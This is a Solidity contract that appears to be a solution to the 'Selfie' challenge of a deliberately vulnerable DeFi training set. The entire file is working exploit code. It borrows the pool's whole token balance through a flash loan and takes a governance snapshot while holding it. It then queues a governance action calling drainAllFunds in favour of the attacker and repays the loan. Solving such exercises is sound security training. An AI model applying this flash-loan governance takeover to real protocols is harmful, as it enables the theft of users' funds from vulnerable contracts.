// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0; 
import "@openzeppelin/contracts-ethereum-package/contracts/math/SafeMath.sol";

/**
 * @title SelfieAttacker
 * @author Elena (Ellena.xyz@proton.me)
 */ 
interface IDamnValuableTokenSnapshot {

    function snapshot() external returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);
}

interface  ISelfiePool {

    function flashLoan(uint256 borrowAmount) external;
}

interface ISimpleGovernance {

function queueAction(address receiver, bytes calldata data, uint256 weiAmount) external returns (uint256);
}

contract SelfieAttacker {
    using SafeMath for uint256;

    ISelfiePool pool;

    IDamnValuableTokenSnapshot token;

    ISimpleGovernance governance;

    uint public actionId;

    address attacker;

    function attack(address _pool, address _token, address _governance) external {

        attacker = msg.sender;

        pool = ISelfiePool(_pool);

        token = IDamnValuableTokenSnapshot(_token);

        governance = ISimpleGovernance(_governance);

        uint amount = token.balanceOf(address(pool));

        pool.flashLoan(amount);
    } 

    function receiveTokens(address _token, uint256 amount) payable external {

        token.snapshot();

        bytes memory drainAllFundsPayload = abi.encodeWithSignature("drainAllFunds(address)", attacker);

        actionId = governance.queueAction(address(pool), drainAllFundsPayload , 0);
        
        token.transfer(address(pool), amount);
    }

}